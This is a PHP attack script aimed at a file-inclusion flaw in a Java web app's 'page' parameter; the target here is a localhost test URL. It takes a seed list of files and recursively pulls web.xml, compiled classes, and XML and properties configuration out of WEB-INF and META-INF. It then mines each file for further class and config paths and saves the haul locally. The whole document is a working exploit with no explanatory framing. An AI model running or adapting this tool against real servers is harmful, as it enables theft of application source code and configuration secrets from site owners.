<?php
	$url = 'http://localhost:8080/WebApplication_ForwardTest/index.jsp?page=$file$';
	$regexp = '/(.*)/mis';
	$outdir = './out/';

	$queue = file('web-inf.txt');
	$checked = [];

	while(count($queue) != 0) {
		echo 'Queue count = '.count($queue).PHP_EOL;
		$file = trim(array_pop($queue));
		checkFile($file);
	}

	function checkFile($file) {
		global $url, $regexp, $checked, $outdir;

		if(!in_array($file, $checked)) {
			$checked[] = $file;
		} else {
			return FALSE;
		}

		$out = @file_get_contents(str_replace('$file$', $file, $url));
		preg_match($regexp, $out, $m);
		if(isset($m[1]) and !empty($m[1])) {
			$result = $m[1];

			if(!file_exists($outdir.dirname($file)))
				mkdir($outdir.dirname($file), 0777, true);
			file_put_contents($outdir.$file, $result);

			parseFile($result, dirname($file).'/');
			echo '+ '.$file.PHP_EOL;
		} else {
			echo '- '.$file.PHP_EOL;
			return FALSE;
		}
	}

	function parseFile($content, $dirname) {
		global $queue, $blacklist;

		# class constant pool
		preg_match_all('/L((?:[a-zA-Z_$][a-zA-Z\d_$]*\/)*[a-zA-Z_$][a-zA-Z\d_$]*);/', $content, $m);
		if(isset($m[1]) and !empty($m[1])) {
			$m[1] = array_unique($m[1]);
			foreach ($m[1] as $class) {
				$queue[] = 'WEB-INF/classes/'.$class.'.class';
			}
		} 

		# web.xml
		preg_match_all('/class>((?:[a-zA-Z_$][a-zA-Z\d_$]*\.)*[a-zA-Z_$][a-zA-Z\d_$]*)<\//', $content, $m);
		if(isset($m[1]) and !empty($m[1])) {
			$m[1] = array_unique($m[1]);
			foreach ($m[1] as $class) {
				$class = str_replace('.', '/', $class);
				$queue[] = 'WEB-INF/classes/'.$class.'.class';
			}
		} 

		# class files
		preg_match_all('/((?:[a-z_$][a-z\d_$]*(?:\.|\/))+[A-Z][a-zA-Z\d_$]*)/', $content, $m);
		if(isset($m[1]) and !empty($m[1])) {
			$m[1] = array_unique($m[1]);
			foreach ($m[1] as $class) {
				$class = str_replace('.', '/', $class);
				$queue[] = 'WEB-INF/classes/'.$class.'.class';
			}
		} 

		# xml, properties files
		preg_match_all('/((?:[a-zA-Z\d\-_$]+\/)*[a-zA-Z\d\-_$]*\.(?:xml|properties))/', $content, $m);
		if(isset($m[1]) and !empty($m[1])) {
			$m[1] = array_unique($m[1]);
			foreach ($m[1] as $file) {
				if(!startsWith($file, 'WEB-INF') and !startsWith($file, 'META-INF')) {
					$queue[] = 'WEB-INF/'.$file;
					$queue[] = 'WEB-INF/classes/'.$file;
					$queue[] = 'WEB-INF/config/'.$file;
					$queue[] = 'WEB-INF/conf/'.$file;
					$queue[] = 'WEB-INF/resources/'.$file;
					$queue[] = 'META-INF/'.$file;
					$queue[] = $dirname.$file;
				} else {
					$queue[] = $file;
				}
			}
		} 
	}

	function startsWith($haystack, $needle){
	    $length = strlen($needle);
	    return (substr($haystack, 0, $length) === $needle);
	}

?>